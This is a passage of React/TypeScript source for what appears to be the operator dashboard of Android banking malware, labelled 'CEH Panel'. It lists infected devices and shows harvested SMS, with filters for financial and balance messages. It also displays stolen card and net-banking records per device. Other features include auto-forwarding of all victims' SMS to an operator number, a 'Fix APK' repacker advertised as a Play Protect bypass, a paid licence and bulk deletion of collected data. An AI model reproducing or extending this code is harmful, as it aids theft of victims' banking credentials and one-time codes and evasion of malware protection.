  const filteredSms = useMemo(() => {
    let list = [...allSms].sort((a, b) => sortByTime(a, b, sortMode));
    // Day filter
    if (smsDayFilter > 0) {
      const cutoff = Date.now() - smsDayFilter * 24 * 60 * 60 * 1000;
      list = list.filter(m => getTs(m) >= cutoff);
    }
    // Type filter
    if (smsTypeFilter === "financial") {
      list = list.filter(m => isFinance(str(m.body || m.message || m.msg || "")));
    } else if (smsTypeFilter === "balance") {
      list = list.filter(m => isBalance(str(m.body || m.message || m.msg || "")));
    }
    return list;
  }, [allSms, sortMode, smsTypeFilter, smsDayFilter]);

  const mixedFeed = useMemo(() => [...forms.map((f) => ({ ...f, _type: "form" as const, _ts: getTs(f) })), ...allSms.map((s) => ({ ...s, _type: "sms" as const, _ts: getTs(s) }))].sort((a, b) => sortByTime(a, b, sortMode)), [forms, allSms, sortMode]);
  const allDataItems = useMemo(() => { const allCards = Object.values(cardMap).flat().map((c) => ({ ...c, _dtype: "card" })); const allNets = Object.values(netMap).flat().map((n) => ({ ...n, _dtype: "net" })); return [...forms.map((f) => ({ ...f, _dtype: "form" })), ...allCards, ...allNets].sort((a, b) => sortByTime(a, b, sortMode)); }, [forms, cardMap, netMap, sortMode]);
  const groups = useMemo(() => { const map: Record<string, AnyRecord[]> = {}; for (const f of forms) { const did = getDeviceId(f); if (!did) continue; if (!map[did]) map[did] = []; map[did].push(f); } for (const [did, cards] of Object.entries(cardMap)) { if (!map[did]) map[did] = []; map[did].push(...(cards || [])); } for (const [did, nets] of Object.entries(netMap)) { if (!map[did]) map[did] = []; map[did].push(...(nets || [])); } return Object.entries(map).map(([did, items]) => ({ deviceId: did, items: items.sort((a, b) => getTs(b) - getTs(a)), latestTs: Math.max(...items.map(getTs).filter(Boolean)) })).sort((a, b) => sortByTime(a, b, sortMode)); }, [forms, cardMap, netMap, sortMode]);
  const sortedDevices = useMemo(() => { const order = deviceOrderRef.current; if (!order.length) { const getCheckedAt = (d: any) => Number(d?.checkedAt || 0); return [...devices].sort((a, b) => deviceSort === "latest" ? getCheckedAt(b) - getCheckedAt(a) : getCheckedAt(a) - getCheckedAt(b)); } const devMap = new Map(devices.map((d) => [str(d.deviceId), d])); const ordered: AnyRecord[] = []; for (const id of (deviceSort === "latest" ? order : [...order].reverse())) { const d = devMap.get(id); if (d) ordered.push(d); } for (const d of devices) { if (!order.includes(str(d.deviceId))) ordered.push(d); } return ordered; }, [devices, deviceSort]);
  function filterQ<T extends AnyRecord>(list: T[]): T[] {
    if (!searchQ) return list;
    return list.filter((item) => {
      const vals = Object.values(item);
      for (const v of vals) {
        if (v && typeof v === "string" && v.toLowerCase().includes(searchQ)) return true;
        if (v && typeof v === "object") {
          const nested = Object.values(v as any);
          for (const n of nested) {
            if (n && typeof n === "string" && (n as string).toLowerCase().includes(searchQ)) return true;
          }
        }
      }
      return false;
    });
  }

  const SORT_OPTS   = [{ value: "new", label: "NEW" }, { value: "old", label: "OLD" }];
  const DEVICE_OPTS = [{ value: "latest", label: "Latest" }, { value: "old2new", label: "Old 2 New" }];
  const isLoading   = loadingForms || loadingSms;

  // Total SMS count
  const totalSmsCount = useMemo(() => allSms.length, [allSms]);

  // License days remaining
  const licenseDaysLeft = useMemo(() => {
    if (!licenseInfo?.expiryDate) return null;
    const parts = licenseInfo.expiryDate.split("/");
    if (parts.length !== 3) return null;
    const expiry = new Date(+parts[2], +parts[1] - 1, +parts[0]);
    const diff = Math.ceil((expiry.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
    return diff;
  }, [licenseInfo]);

  if (helpScreen === "fixapk") {
    return <FixApkScreen dark={dark} panelId={fixPanelId} setPanelId={setFixPanelId} phase={fixPhase} error={fixError}
      filename={fixFilename} apkSize={fixApkSize} onStart={startFixApk} onDownload={downloadFixedApk}
      onClose={closeFixApk} onReset={() => { setFixPhase("idle"); setFixError(""); setFixReqId(""); setFixApkSize(""); setFixTimeTaken(""); }}
      isDownloading={fixDownloading} timeTaken={fixTimeTaken} />;
  }

  return (
    <div className={`min-h-screen ${D.page(dark)}`}>
      <CehBanner dark={dark} alertText={alertText} />
      <TopNav activeTab={activeTab} onTabChange={handleTabChange} darkMode={dark} onToggleDark={() => setDark((d) => !d)} alertText={alertText} />
      {activeTab !== "devices" && activeTab !== "help" && activeTab !== "messages" && (<SearchBar value={search} onChange={setSearch} onSearch={commitSearch} filter={sortMode} onFilter={(v) => setSortMode(v as SortMode)} options={SORT_OPTS} dark={dark} />)}

      {activeTab === "home" && (
        <div className="space-y-3 px-0 pb-24 pt-1">
          <FixApkBanner dark={dark} onOpen={openFixApk} />
          {isLoading ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
            : filterQ(mixedFeed).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data yet.</div>
            : <div className="space-y-3 px-3">{filterQ(mixedFeed).slice(0, 100).map((item, i) => item._type === "form" ? <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} /> : <SmsCard key={getId(item) || i} sms={item} onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(item)]} deviceNumMap={deviceNumMap} />)}</div>}
        </div>
      )}

      {activeTab === "data" && (<div className="space-y-3 px-3 pb-24 pt-1">{isLoading || loadingGroups ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div> : filterQ(allDataItems).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data.</div> : filterQ(allDataItems).map((item, i) => <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />)}</div>)}

      {/* ── MESSAGES TAB with filters ── */}
      {activeTab === "messages" && (
        <div className="pb-24">
          {/* Search + Sort */}
          <SearchBar value={search} onChange={setSearch} onSearch={commitSearch} filter={sortMode} onFilter={(v) => setSortMode(v as SortMode)} options={SORT_OPTS} dark={dark} />

          {/* Type filter */}
          <div className="flex gap-2 px-3 pb-2 overflow-x-auto scrollbar-hide">
            {([["all", "🗂️ All"], ["financial", "💳 Financial"], ["balance", "💰 Balance"]] as [SmsFilter, string][]).map(([val, label]) => (
              <button key={val} type="button" onClick={() => setSmsTypeFilter(val)}
                className={`shrink-0 rounded-full px-3 py-1.5 text-[12px] font-bold border transition-all ${smsTypeFilter === val ? "bg-blue-600 border-blue-600 text-white" : (dark ? "bg-gray-700 border-gray-600 text-gray-300" : "bg-white border-gray-200 text-gray-600")}`}>
                {label}
              </button>
            ))}
          </div>

          {/* Day filter */}
          <div className="flex gap-1.5 px-3 pb-3 overflow-x-auto scrollbar-hide">
            <button type="button" onClick={() => setSmsDayFilter(0)}
              className={`shrink-0 rounded-full px-3 py-1 text-[11px] font-bold border transition-all ${smsDayFilter === 0 ? "bg-gray-800 border-gray-800 text-white" : (dark ? "bg-gray-700 border-gray-600 text-gray-400" : "bg-white border-gray-200 text-gray-500")}`}>
              All Days
            </button>
            {([1,2,3,4,5,6,7] as SmsDayFilter[]).map(d => (
              <button key={d} type="button" onClick={() => setSmsDayFilter(d)}
                className={`shrink-0 rounded-full px-3 py-1 text-[11px] font-bold border transition-all ${smsDayFilter === d ? "bg-gray-800 border-gray-800 text-white" : (dark ? "bg-gray-700 border-gray-600 text-gray-400" : "bg-white border-gray-200 text-gray-500")}`}>
                {d}d
              </button>
            ))}
          </div>

          <div className="space-y-3 px-3">
            {loadingSms ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
              : filterQ(filteredSms).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No messages.</div>
              : filterQ(filteredSms).slice(0, 100).map((m, i) => <SmsCard key={getId(m) || i} sms={m} onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(m)]} deviceNumMap={deviceNumMap} />)}
          </div>
        </div>
      )}

      {activeTab === "groups" && (<div className="space-y-3 px-3 pb-24 pt-1">{loadingForms || loadingGroups ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div> : filterQ(groups).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No grouped data.</div> : filterQ(groups).map((g) => <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />)}</div>)}

      {activeTab === "devices" && (
        <div className="pb-24">
          <SearchBar value={search} onChange={setSearch} onSearch={commitSearch} filter={deviceSort} onFilter={(v) => setDeviceSort(v as DeviceSortMode)} options={DEVICE_OPTS} dark={dark} />
          {/* Total device count */}
          {!loadingDevices && sortedDevices.length > 0 && (
            <div className={`px-4 py-2 mb-1 ${dark ? "text-gray-400" : "text-gray-500"}`}>
              <span className="text-[12px] font-semibold">
                Total: <span className={`font-black text-[13px] ${dark ? "text-white" : "text-gray-900"}`}>{sortedDevices.length}</span> devices
              </span>
            </div>
          )}
          {loadingDevices ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div> : filterQ(sortedDevices).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No devices.</div> :
            <div className="grid grid-cols-2 gap-3 px-3 pt-1">{filterQ(sortedDevices).map((d, i) => <DeviceCard key={str(d.deviceId) || i} device={d} displayNum={deviceNumMap[str(d.deviceId)] ?? (filterQ(sortedDevices).length - i)} onCheckOnline={handleCheckOnline} onOpen={openDevice} recentlyOnline={!!recentlyOnlineMap[str(d.deviceId)]} dark={dark} isUninstalled={uninstalledSet.has(str(d.deviceId)) || str(d.fcmToken) === "__UNINSTALLED__"} isFavorite={favoritesMap[str(d.deviceId)] === true} onToggleFavorite={toggleFavorite} />)}</div>}
        </div>
      )}

      {/* HELP BOTTOM SHEET */}
      {helpOpen && (
        <div className="fixed inset-0 z-[1000] flex items-end bg-black/60" onClick={() => setHelpOpen(false)}>
          <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8" onClick={(e) => e.stopPropagation()}>
            <div className="mb-4 flex items-center justify-between"><span className="text-[18px] font-bold text-white">Help</span><button type="button" onClick={() => setHelpOpen(false)} className="flex h-7 w-7 items-center justify-center rounded-lg border border-gray-600 text-[14px] text-gray-400">✕</button></div>
            <div className="mb-5 divide-y divide-gray-700 border-t border-gray-700">
              {[{ label: "Fix APK", icon: "🔧", onClick: openFixApk }, { label: "APK Info", icon: "📦", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } }, { label: "Settings", icon: "⚙️", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadSettingsData(); loadLicenseInfo(); } }, { label: "Logout", icon: "🚪", onClick: handleLogout }].map((item) => (
                <button key={item.label} type="button" onClick={item.onClick} className="flex w-full items-center justify-between py-3 text-[15px] text-gray-200">
                  <span className="flex items-center gap-3"><span className="text-[18px]">{item.icon}</span>{item.label}</span><span className="text-gray-500">›</span>
                </button>
              ))}
            </div>
            <div className="space-y-2">
              <button type="button" onClick={() => setContactOpen(true)} className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-semibold text-green-400">Contact Us</button>
              <button type="button" onClick={openTelegramHelp} className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-semibold text-blue-400">Telegram Channel</button>
            </div>
          </div>
        </div>
      )}

      {contactOpen && (
        <div className="fixed inset-0 z-[1001] flex items-end justify-center bg-black/40" onClick={() => setContactOpen(false)}>
          <div className="w-full rounded-t-2xl bg-white px-5 pt-5 pb-8" onClick={(e) => e.stopPropagation()}>
            <div className="mb-4 text-center text-[15px] font-extrabold text-gray-900">Contact Us</div>
            <div className="space-y-3">
              <button type="button" onClick={() => { setContactOpen(false); openWhatsApp(); }} className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-extrabold text-green-600">WhatsApp</button>
              <button type="button" onClick={() => { setContactOpen(false); openTelegramTarget(); }} className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-extrabold text-blue-600">Telegram</button>
            </div>
          </div>
        </div>
      )}

      {/* ══ SETTINGS SCREEN ══ */}
      {helpScreen === "settings" && (
        <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f2f2f7]">
          <div className="sticky top-0 z-10 flex items-center gap-3 border-b border-gray-200 bg-white px-4 py-3 shadow-sm">
            <button type="button" onClick={() => setHelpScreen("")} className="flex h-8 w-8 items-center justify-center rounded-full bg-gray-100 text-[18px] text-gray-600">←</button>
            <span className="text-[17px] font-bold text-gray-900">Settings</span>
          </div>
          <div className="mx-auto max-w-[480px] space-y-3 p-4">

            {/* License Info Card */}
            {licenseInfo && (
              <div className={`rounded-2xl p-4 shadow-sm overflow-hidden ${
                licenseDaysLeft !== null && licenseDaysLeft <= 5
                  ? "bg-red-50 border border-red-200"
                  : "bg-white"
              }`}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="text-[18px]">📅</span>
                    <span className="text-[14px] font-bold text-gray-800">License Status</span>
                  </div>
                  <span className={`rounded-full px-3 py-1 text-[11px] font-black ${
                    licenseInfo.status === "Active" ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"
                  }`}>{licenseInfo.status}</span>
                </div>
                <div className="mt-3 flex items-center justify-between">
                  <div>
                    <div className="text-[11px] text-gray-400 uppercase tracking-wide">Expiry Date</div>
                    <div className="text-[16px] font-black text-gray-900">{licenseInfo.expiryDate}</div>
                  </div>
                  {licenseDaysLeft !== null && (
                    <div className={`text-right`}>
                      <div className="text-[11px] text-gray-400 uppercase tracking-wide">Bacha Hua</div>
                      <div className={`text-[22px] font-black ${licenseDaysLeft <= 5 ? "text-red-600" : licenseDaysLeft <= 10 ? "text-orange-500" : "text-green-600"}`}>
                        {licenseDaysLeft > 0 ? `${licenseDaysLeft}d` : "Expired!"}
                      </div>
                    </div>
                  )}
                </div>
                {licenseDaysLeft !== null && licenseDaysLeft <= 5 && (
                  <div className="mt-2 rounded-xl bg-red-100 px-3 py-2 text-[12px] font-semibold text-red-600">
                    ⚠️ License jaldi expire hone wali hai! Renew karo.
                  </div>
                )}
              </div>
            )}

            {/* SMS Forwarding */}
            <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
              <div className="px-5 pt-5 pb-2">
                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">📲</span><span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span></div>
                <p className="text-[12px] text-gray-400 mb-4">Sabhi SMS automatically ek number pe forward hote hain</p>
                <div className="flex items-center justify-between mb-5 p-3 rounded-xl bg-gray-50 border border-gray-100">
                  <div><div className="text-[13px] font-semibold text-gray-700">Forwarding</div><div className={`text-[11px] font-medium ${globalEnabled ? "text-green-600" : "text-gray-400"}`}>{globalEnabled ? "ON — Active" : "OFF — Disabled"}</div></div>
                  <button type="button" onClick={() => { setGlobalEnabled((v) => !v); setGlobalMsg(""); }} className={`relative h-8 w-14 rounded-full transition-colors duration-200 ${globalEnabled ? "bg-green-500" : "bg-gray-300"}`}><span className={`absolute top-1 h-6 w-6 rounded-full bg-white shadow transition-transform duration-200 ${globalEnabled ? "translate-x-7" : "translate-x-1"}`} /></button>
                </div>
                <SettingsInput label="Forward Number" hint="Jis number pe SMS bhejne hain (with country code)" value={globalPhone} onChange={setGlobalPhone} inputMode="tel" />
              </div>
              <div className="px-5 pb-5"><button type="button" onClick={saveGlobalPhone} disabled={globalLoading} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">{globalLoading ? "Saving…" : "Save Changes"}</button>{globalMsg && <div className="mt-2 text-center text-[13px] font-medium">{globalMsg}</div>}</div>
            </div>

            {/* Change Login Password */}
            <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
              <div className="px-5 pt-5 pb-2">
                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">🔑</span><span className="text-[15px] font-bold text-gray-900">Login Password Change</span></div>
                <p className="text-[12px] text-gray-400 mb-4">Password change hone par sare devices se logout ho jaoge</p>
                <SettingsInput label="Purana Password" value={loginPassOld} onChange={setLoginPassOld} type="password" />
                <SettingsInput label="Naya Password" value={loginPassNew} onChange={setLoginPassNew} type="password" />
                <SettingsInput label="Naya Password Confirm" value={loginPassConfirm} onChange={setLoginPassConfirm} type="password" />
              </div>
              <div className="px-5 pb-5">
                <button type="button" onClick={changeLoginPassword} disabled={loginPassLoading}
                  className="w-full rounded-xl bg-blue-600 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
                  {loginPassLoading ? "Changing…" : "🔑 Password Change Karo"}
                </button>
                {loginPassMsg && <div className="mt-2 text-center text-[13px] font-medium">{loginPassMsg}</div>}
              </div>
            </div>



            {/* Delete Password PIN */}
            <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
              <div className="px-5 pt-5 pb-2">
                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">🔐</span><span className="text-[15px] font-bold text-gray-900">{pinIsSet === false ? "Set Delete PIN" : "Change Delete PIN"}</span></div>
                <p className="text-[12px] text-gray-400 mb-4">{pinIsSet === false ? "SMS/Device delete ke liye PIN set karo" : "SMS/Device delete PIN badlo"}</p>
                {pinIsSet !== false && <SettingsInput label="Old PIN" value={pinOld} onChange={setPinOld} type="password" inputMode="numeric" />}
                <SettingsInput label="New PIN" value={pinNew} onChange={setPinNew} type="password" inputMode="numeric" />
                <SettingsInput label="Confirm PIN" value={pinConfirm} onChange={setPinConfirm} type="password" inputMode="numeric" />
              </div>
              <div className="px-5 pb-5"><button type="button" onClick={changePin} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white active:scale-[0.98]">{pinIsSet === false ? "Set PIN" : "Change PIN"}</button>{pinMsg && <div className="mt-2 text-center text-[13px] font-medium">{pinMsg}</div>}</div>
            </div>

            {/* ─── Fix APK Card ─── */}
            <div
              onClick={() => { setHelpScreen(""); setTimeout(openFixApk, 100); }}
              className="cursor-pointer rounded-2xl overflow-hidden shadow-sm active:scale-[0.98] transition-transform"
              style={{ background: "linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)" }}>
              <div className="px-5 py-4 flex items-center justify-between">
                <div className="flex-1">
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[11px] font-bold tracking-widest text-orange-400 uppercase">APK Protection</span>
                  </div>
                  <div className="text-[16px] font-black text-white leading-tight mb-1">Fix APK</div>
                  <div className="text-[11px] text-blue-200">Play Protect bypass — automatic repack</div>
                </div>
                <div className="flex h-12 w-12 items-center justify-center rounded-2xl shadow-lg ml-3"
                  style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
                  <span className="text-[22px]">🔧</span>
                </div>
              </div>
            </div>

            {/* ─── Download Admin APK ─── */}
            <AdminApkCard dark={false} panelId={str(ENV.PANEL_ID || "")} apiBase={str(ENV.API_BASE || "")} apiHeaders={apiHeaders()} />

            {/* ─── Danger Zone ─── */}
            <div className="rounded-2xl overflow-hidden border-2 border-red-200 bg-white shadow-sm">
              <div className="px-5 pt-5 pb-3">
                <div className="flex items-center gap-2 mb-1">
                  <span className="text-[18px]">⚠️</span>
                  <span className="text-[15px] font-black text-red-600">Danger Zone</span>
                </div>
                <p className="text-[12px] text-red-400 mb-4">Yahan se kiya koi bhi action undo nahi ho sakta. Soch ke karo!</p>

                {/* Delete All SMS */}
                <div className="mb-3 rounded-xl bg-red-50 border border-red-100 p-4">
                  <div className="flex items-start justify-between gap-3">
                    <div className="flex-1">
                      <div className="text-[13px] font-bold text-red-700 mb-0.5">🗑️ Delete All SMS</div>
                      <div className="text-[11px] text-red-400">Saare SMS/notifications permanently delete ho jaayenge. Ye action undo nahi hoga!</div>
                    </div>
                    <div className="flex flex-col items-center justify-center rounded-xl bg-red-100 px-3 py-2 min-w-[52px]">
                      <div className="text-[18px] font-black text-red-600 leading-none">{totalSmsCount}</div>
                      <div className="text-[9px] text-red-400 font-semibold uppercase tracking-wide mt-0.5">Total</div>
                    </div>
                  </div>
                  <input
                    type="password"
                    inputMode="numeric"
                    value={dangerPin}
                    onChange={(e) => setDangerPin(e.target.value)}
                    placeholder="Delete PIN daalo..."
                    className="mt-3 w-full rounded-xl border border-red-200 bg-white px-4 py-2.5 text-[13px] font-semibold text-gray-800 outline-none focus:border-red-400"
                  />
                  <button type="button" onClick={() => {
                    if (window.confirm(`Pakka? ${totalSmsCount} SMS delete ho jaayenge — ye wapas nahi aayenge!`)) deleteAllSms();
                  }} disabled={dangerLoading}
                    className="mt-2 w-full rounded-xl bg-red-600 py-2.5 text-[13px] font-black text-white disabled:opacity-50 active:scale-[0.98]">
                    {dangerLoading ? "Deleting…" : `🗑️ Delete All ${totalSmsCount} SMS`}
                  </button>
                </div>

                {dangerMsg && <div className="mt-3 text-center text-[13px] font-semibold text-gray-700">{dangerMsg}</div>}
              </div>
            </div>

            {/* ─── Developer Zone ─── */}
            <DevZone apiBase={str(ENV.API_BASE || "")} apiHeaders={apiHeaders()} />

          </div>
        </div>
      )}

      {/* APK INFO SCREEN */}
      {helpScreen === "apk" && (
        <div className="fixed inset-0 z-[1000] overflow-auto"
          style={{ background: "linear-gradient(160deg, #0f0c29 0%, #302b63 60%, #24243e 100%)" }}>
          {/* Header */}
          <div className="flex items-center gap-3 px-4 pt-12 pb-2">
            <button type="button" onClick={() => setHelpScreen("")}
              className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">←</button>
            <div className="flex-1">
              <div className="text-[10px] font-bold tracking-widest text-orange-400 uppercase">CEH Panel</div>
              <div className="text-[20px] font-black text-white">APK Info</div>
            </div>
            <div className="flex h-11 w-11 items-center justify-center rounded-2xl"
              style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
              <span className="text-[20px]">📦</span>
            </div>
          </div>

          <div className="px-4 pb-10 pt-4 space-y-3">
            {/* License Status Hero Card */}
            <div className="rounded-2xl overflow-hidden border border-white/10"
              style={{ background: "linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.04))" }}>
              <div className="px-5 pt-5 pb-4">
                <div className="flex items-center justify-between mb-4">
                  <div className="text-[11px] font-bold tracking-widest text-white/40 uppercase">License</div>
                  <span className={`rounded-full px-3 py-1 text-[11px] font-black ${
                    licenseInfo?.status === "Active"
                      ? "bg-green-500/20 text-green-400 border border-green-500/30"
                      : "bg-red-500/20 text-red-400 border border-red-500/30"
                  }`}>{licenseInfo?.status || "Active"}</span>
                </div>
                <div className="flex items-end justify-between">
                  <div>
                    <div className="text-[11px] text-white/30 mb-1">Expiry Date</div>
                    <div className="text-[22px] font-black text-white">{licenseInfo?.expiryDate || "—"}</div>
                  </div>
                  {licenseDaysLeft !== null && (
                    <div className="text-right">
                      <div className="text-[11px] text-white/30 mb-1">Bacha Hua</div>
                      <div className={`text-[28px] font-black leading-none ${
                        licenseDaysLeft <= 5 ? "text-red-400" : licenseDaysLeft <= 10 ? "text-orange-400" : "text-green-400"
                      }`}>{licenseDaysLeft > 0 ? `${licenseDaysLeft}d` : "Expired!"}</div>
                    </div>
                  )}
                </div>
                {licenseDaysLeft !== null && licenseDaysLeft <= 5 && (
                  <div className="mt-3 rounded-xl bg-red-500/20 border border-red-500/30 px-3 py-2 text-[12px] font-semibold text-red-400">
                    ⚠️ License jaldi expire hone wali hai! Renew karo.
                  </div>
                )}
              </div>
              {/* Progress bar for days */}
              {licenseDaysLeft !== null && licenseDaysLeft > 0 && (
                <div className="px-5 pb-4">
                  <div className="h-1.5 w-full rounded-full bg-white/10 overflow-hidden">
                    <div className="h-full rounded-full transition-all duration-700"
                      style={{
                        width: `${Math.min(100, (licenseDaysLeft / 30) * 100)}%`,
                        background: licenseDaysLeft <= 5 ? "#ef4444" : licenseDaysLeft <= 10 ? "#f97316" : "linear-gradient(90deg, #4ade80, #22d3ee)",
                      }} />
                  </div>
                  <div className="mt-1.5 flex justify-between text-[10px] text-white/20">
                    <span>0d</span><span>30d</span>
                  </div>
                </div>
              )}
            </div>

            {/* Panel Details Grid */}
            <div className="grid grid-cols-2 gap-3">
              {[
                { icon: "🆔", label: "Panel ID", value: str(ENV.PANEL_ID || "-"), full: true },
                { icon: "🏷️", label: "Version", value: str(ENV.VERSION || "v1.0") },
                { icon: "💬", label: "Total SMS", value: String(totalSmsCount) },
                { icon: "📱", label: "Devices", value: String(devices.length) },
                { icon: "📋", label: "Forms", value: String(forms.length) },
                { icon: "⭐", label: "Favorites", value: String(Object.values(favoritesMap).filter(Boolean).length) },
              ].map((item) => (
                item.full ? (
                  <div key={item.label} className="col-span-2 rounded-2xl border border-white/10 px-4 py-3"
                    style={{ background: "rgba(255,255,255,0.06)" }}>
                    <div className="flex items-center gap-3">
                      <span className="text-[20px]">{item.icon}</span>
                      <div className="flex-1 min-w-0">
                        <div className="text-[10px] text-white/30 uppercase tracking-wide">{item.label}</div>
                        <div className="text-[14px] font-black text-white truncate">{item.value}</div>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div key={item.label} className="rounded-2xl border border-white/10 px-4 py-3"
                    style={{ background: "rgba(255,255,255,0.06)" }}>
                    <span className="text-[20px]">{item.icon}</span>
                    <div className="text-[10px] text-white/30 uppercase tracking-wide mt-2">{item.label}</div>
                    <div className="text-[18px] font-black text-white">{item.value}</div>
                  </div>
                )
              ))}
            </div>

            {/* Contact Info */}
            {str(ENV.TELEGRAM_CHANNEL || "") && (
              <div className="rounded-2xl border border-white/10 px-4 py-3"
                style={{ background: "rgba(255,255,255,0.06)" }}>
                <div className="text-[10px] text-white/30 uppercase tracking-wide mb-1">📡 Telegram Channel</div>
                <div className="text-[13px] font-semibold text-blue-300 truncate">{str(ENV.TELEGRAM_CHANNEL || "")}</div>
              </div>
            )}

            {/* Buttons */}
            <button type="button" onClick={openTelegramHelp}
              className="w-full rounded-2xl border-2 border-blue-500/50 bg-blue-500/10 py-3.5 text-[14px] font-bold text-blue-400 active:scale-[0.98] transition-transform">
              📢 Join Telegram Channel
            </button>
            <button type="button" onClick={openFixApk}
              className="w-full rounded-2xl py-3.5 text-[14px] font-black text-black active:scale-[0.98] transition-transform"
              style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
              🔧 Fix APK Karo
            </button>
          </div>
        </div>
      )}

      <button type="button" onClick={loadAll} className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800" title="Refresh">↻</button>
      {checkAlert && <CheckAlert status={checkAlert.status} onClose={closeCheckAlert} />}
    </div>
  );
}
